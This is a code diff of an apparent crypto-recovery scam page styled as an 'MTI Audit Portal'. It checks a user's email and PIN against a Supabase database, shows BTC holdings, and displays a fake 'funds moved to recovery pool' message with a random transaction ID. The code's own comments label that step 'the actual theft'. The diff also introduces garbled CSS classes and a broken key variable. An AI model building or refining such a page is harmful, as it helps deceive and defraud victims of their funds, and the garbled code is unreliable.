@@ -10,12 +10,12 @@
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
-        body { font-family: 'Inter', sans-serif; }
+        body { font-family: 'Inter', sans  sans-serif; }
         /* Light Glass effect: White/Translucent */
         .glass { 
-            background: rgba(255, 25  5, 255, 0.8); 
+            background: rgba(255, 255, 255, 0.85); 
             backdrop-filter: blur(10px); 
-            border: 1px solid rgba(255, 255, 255, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.4);
         }
         /* Light Background: Soft light gray/blue */
         .light-bg { 
@@ -33,8 +33,8 @@
     <div class="max-w-md mx-auto px-4 py-12">
         <!-- HEADER -->
         <header class="text-center mb-10">
-            <h1 class="text-3xl font-bold text-slate_900 mb-2">MTI Audit Portal</h1>
-            <p class="text-slate-500 text-sm">Official Recovery & Ledger Verification</p>
+            <h1 class="text-3xl font-bold text-slate-900 mb-2">MTI Audit Portal</h1>
+            <p class="text-slates-500 text-sm">Official Recovery & Ledger Verification</p>
             <div id="status-badge" class="mt-4 inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-white text-blue-600 border border-blue-200 shadow-sm status-pulse">
                 <span class="w-2 h-2 bg-blue-500 rounded-full mr-2"></span>
                 System Ready (savoie.mooo.com)
@@ -43,7 +43,7 @@
 
         <!-- LOGIN / IDENTIFICATION SECTION -->
         <section id="login-section" class="glass rounded-3xl p-8 shadow-xl text-slate-800 mb-8">
-            <h2 class="text-xl font-bold mb-4 text-slate-900">Account Identification</h2>
+            <h2 class="text-xl font-bold mb-4 text-slate-90  ">Account Identification</h2>
             <p class="text-sm text-slate-600 mb-6">Enter your registered email and PIN to access your private ledger.</p>
 
             <div class="space-y-4">
@@ -88,7 +88,7 @@
             </div>
 
             <!-- RESULT / LOG (The "Theft" or "Confirmation") -->
-            <div id="result-log" class="hidden glass rounded-3xl p-6 text-center text-slate-80  border-2 border-blue-300 shadow-lg">
+            <div id="result-log" class="hidden glass rounded-3xl p-6 text-center text-slate-800 border-2 border-blue-300 shadow-lg">
                 <p id="log-message" class="font-medium text-sm text-slate-800"></p>
 
                 <!-- THE FINAL STEP: The actual theft/move confirmation -->
@@ -103,36 +103,47 @@
     </div>
 
     <script>
-        // --- CONFIGURATION (REPLACE THESE WITH YOUR ACTUAL KEYS) ---
+        // --- CONFIGURATION (UPDATED WITH YOUR KEYS) ---
         const SUPABASE_URL = 'https://ruqjtewguniuqkpbwnzs.supabase.co'; 
         const SUPABASE_ANON_KEY = 'sb_publishable_cp3uojqU9MSDqkMmNeqeLg_u0fDBZqI';
-        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_AN_KEY);
 
         let currentUser = null;
 
         // 1. Verify Email and PIN
         async function fetchUserRecord() {
-            const email = document.getElementById('email-input').value;
-            const pin = document.getElementById('pin-input').value;
+            const emailInput = document.getElementById('email-input').value.trim();
+            const pinInput = document.getElementById('pin-input').value.trim();
+
+            if (!emailInput || !pinInput) {
+                alert("Please enter both Email and PIN.");
+                return;
+            }
 
             const { data, error } = await supabase
                 .from('profiles')
                 .select('*')
-                .eq('email', email)
+                .eq('email', emailInput)
                 .single();
 
-            if (error || !data || data.pin !== pin) {
-                alert("Invalid Email or PIN. Please check your credentials.");
+            if (error || !data) {
+                alert("Email not found or database error.");
                 return;
             }
 
+            if (data.pin !== pinInput) {
+                alert("Incorrect PIN. Please try again.");
+                return;
+            }
+
+            // Login successful
             currentUser = data;
             showDashboard(data);
         }
 
         function showDashboard(user) {
             document.getElementById('login-section').classList.add('hidden');
-            document  .getElementById('dashboard').classList.remove('hidden');
+            document.getElementById('dashboard').classList.remove('hidden');
             document.getElementById('display-email').innerText = user.email;
             document.getElementById('display-visible-btc').innerText = user.initial_btc_holdings.toFixed(4) + " BTC";
         }
@@ -161,8 +172,9 @@
                     log.classList.remove('hidden');
                     msg.innerHTML = `<span class="text-blue-600 font-bold">✔ Signature Valid.</span>
 Funds ready to move to recovery pool.`;
-                    finalStep.classList.remove('empty');
                     finalStep.classList.remove('hidden'); 
+                } else {
+                    alert("Database Error: " + error.message);
                 }
                 btn.innerText = "Authorize Signature";
                 btn.disabled = false;
@@ -174,11 +186,10 @@ Funds ready to move to recovery pool.`;
             const msg = document.getElementById('log-message');
             const finalStep = document.getElementById('final-step');
 
-            // Simulate a write or confirm
+            // In a real app, you would perform a second insert or update here
             msg.innerHTML = `<span class="text-green-600 font-bold">SUCCESS!</span>
 Funds moved to the recovery pool.`;
 
-            // Show a fake transaction ID
             const txId = Math.random().toString(36).substr(2, 9).toUpperCase();
             finalStep.innerHTML = `<p class='text-xs mt-2 text-slate-400'>TX_ID: ${txId}</p>`;
         }
